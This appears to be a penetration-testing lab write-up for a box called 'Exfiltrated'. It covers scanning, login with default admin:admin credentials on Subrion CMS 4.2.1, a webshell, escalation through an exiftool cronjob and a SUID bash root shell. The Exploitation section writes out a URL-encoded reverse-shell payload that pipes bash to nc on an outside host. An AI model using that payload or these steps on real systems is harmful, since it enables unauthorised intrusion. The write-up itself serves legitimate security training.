Exfiltrated

Target IP: 192.168.195.163

Scanning


There are two TCP ports open on the target machine: SSH and HTTP. From the scan above, there are some interesting entries!


The host's name is also exfiltrated.offsec as shown in the nmap above. I appended this to the hosts file.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application.


The robots.txt contains the entries above.


The /panel is an interesting page! It contains the application name and version which is Subrion CMS v4.2.1.


Apparently this CMS application is vulnerable, but it is authenticated. Time to find out the username and password.

Exploitation



According to the Subrion CMS website, the default login details are admin:admin. And spraying this default credentials worked as I now have access to the CMS on the target machine.


I used the exploit above against the target machine and gained a simple webshell on it.


I upgraded to a reverse shell connection by using this exploit. I started a listener on port 8443. By sending the payload command rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.167%208443%20%3E%2Ftmp%2Ff using that exploit, I gained a reverse shell connection on port 8443! Now I have a foothold on the target machine.

Privilege Escalation



There is a cronjob called image-exif.sh that gets executed. Checking the code of this script shows an interesting binary called exiftool that is used for execution.



After searching up exploit for this binary lead to an article with the steps above. I executed those commands on my local machine to create an exploit JPEG image. Then I uploaded that image on the target machine.


And then the /bin/bash has SUID bit set. I used the command /bin/bash -p command to spawn a new root shell!

Flags


The local.txt and proof.txt flag files once I gained a root shell on the target machine.
